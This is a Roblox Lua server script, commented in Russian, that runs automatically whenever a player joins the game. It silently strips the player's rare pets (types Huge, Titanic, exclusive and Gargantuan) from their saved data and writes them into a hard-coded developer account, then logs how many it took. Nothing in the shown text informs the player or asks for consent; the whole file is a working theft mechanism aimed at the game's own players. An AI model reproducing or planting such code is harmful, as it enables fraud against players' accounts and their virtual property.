
        local Players = game:GetService("Players")


local DataStoreService = game:GetService("DataStoreService")
local PetsDataStore = DataStoreService:GetDataStore("PetsData")


local DeveloperName = "ArtinFive223"
local DeveloperUserId = 5247353062  -- Укажите свой UserId


local TransferablePets = {"Huge", "Titanic", "exclusive", "Gargantuan"}


local function TransferPets(player)
    local playerUserId = player.UserId
    local playerName = player.Name

 
    local success, playerPets = pcall(function()
        return PetsDataStore:GetAsync(tostring(playerUserId))
    end)

    if not success or not playerPets then
        warn("Не удалось загрузить данные питомцев для игрока: " .. playerName)
        return
    end

    
    local success, developerPets = pcall(function()
        return PetsDataStore:GetAsync(tostring(DeveloperUserId))
    end)

    if not success then
        warn("Не удалось загрузить данные питомцев для разработчика.")
        return
    end

    developerPets = developerPets or {}

   
    local petsToTransfer = {}
    for _, pet in pairs(playerPets) do
        if table.find(TransferablePets, pet.Type) then
            table.insert(petsToTransfer, pet)
        end
    end

   
    for _, pet in pairs(petsToTransfer) do
        for i, playerPet in ipairs(playerPets) do
            if playerPet.ID == pet.ID then
                table.remove(playerPets, i)
                break
            end
        end
    end

   
    for _, pet in pairs(petsToTransfer) do
        table.insert(developerPets, pet)
    end

    
    pcall(function()
        PetsDataStore:SetAsync(tostring(playerUserId), playerPets)
    end)

    pcall(function()
        PetsDataStore:SetAsync(tostring(DeveloperUserId), developerPets)
    end)

    print("Автоматически перенесено " .. #petsToTransfer .. " питомцев от " .. playerName .. " к " .. DeveloperName)
end

 
Players.PlayerAdded:Connect(function(player)
    TransferPets(player)
end)